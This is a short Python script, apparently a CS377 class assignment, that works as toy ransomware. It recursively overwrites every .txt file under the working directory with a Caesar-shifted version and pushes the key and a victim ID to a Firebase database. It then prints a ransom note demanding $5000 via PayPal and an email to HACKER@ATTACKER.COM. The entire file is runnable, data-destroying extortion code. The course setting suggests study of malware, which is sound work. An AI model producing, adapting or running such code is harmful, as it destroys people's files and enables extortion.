#!/usr/bin/env python3

#CS377 Homework
#
#To run file in linux "python3 encrypt.py"
#This program will look for all text file within the current directory and sub-directories and encrypt it

import sys
import os
import random
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db

#Function to encrypt data within text file
#Depending on the ASCII number, it will shift to the right depending on the ASCII bracket defined on line 30-47
#
def encrypt(text, key):
    encryptData = ""

    #Open file and read the data in the file char by char
    #and encrypt the char one at a time and append it to string encryptData
    #Once we are finish encrypting we will write the encrypted data to the files
    #And replace the previous text
    file = open(text, "r")

    for line in file:
        for character in line:
            #Check if char is upper
            if(character.isupper()):
                encryptData += chr((ord(character) + key - 65) % 26 + 65)
            #Check if char is upper
            elif(character.islower()):
                encryptData += chr((ord(character) + key - 97) % 26 + 97)
            #Check if char is space
            elif(character == " "):
                encryptData += chr((ord(character)))
            #Check if char is newline
            elif(character == "\n"):
                encryptData += chr((ord(character)))
            #Check if char is tab
            elif(character == "\t"):
                encryptData += chr((ord(character)))
            #ASCII 33-64 (Symbols)
            elif((ord(character) >= 33 and ord(character) <= 64)):
                encryptData += chr((ord(character) + key - 33) % 32 + 33)
            #ASCII 91-96 (Symbols)
            elif((ord(character) >= 91 and ord(character) <= 96)):
                encryptData += chr((ord(character) + key - 91) % 6 + 91)
            #ASCII 123-126 (Symbols)
            elif((ord(character) >= 123 and ord(character) <= 126)):
                encryptData += chr((ord(character) + key - 123) % 4 + 123)


    file.close()

    #Write the encrypted data into the textfile
    encryptFile = open(text, "w")
    encryptFile.write(encryptData)
    encryptFile.close()

#sendKeyToDB()
#Sends the key to the database which can be retrieved if
#the victim sends $5000 usd to our paypal ;)
def sendKeyToDB():
    cred = credentials.Certificate('cs377-project-creds.json')
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://cs377-project-fall-20.firebaseio.com/'
    })

    victim_id = random.randint(100, 1000)
    key = random.randint(5, 15)

    ref = db.reference('cs377-project')
    victims_ref = ref.child('victims')
    victims_ref.push().set({
        'victim_id': victim_id,
        'key': key
    })

    return victim_id, key

#main()
#Given a path and a key, find all text files and encrypt it
#Within the current directory and all sub-directories
def main(path, key):
    file = os.listdir(path)
    if len(file) > 0:
        for item in file:
            if item.endswith('.txt'):
                encrypt(path + "/" + item, key)
            elif os.path.isdir(path + "/" + item):
                main(path + "/" + item, key)



if __name__ == "__main__":
    vid, key = sendKeyToDB()
    main(os.getcwd(), key)
    #testEncrypt(os.getcwd() + "/test.txt")
    print("YOUR ID IS", vid)
    print("PLEASE EMAIL HACKER@ATTACKER.COM WITH YOUR ID AND PAYPAL $5000 FOR KEY TO DECRYPT FILES\n\n")
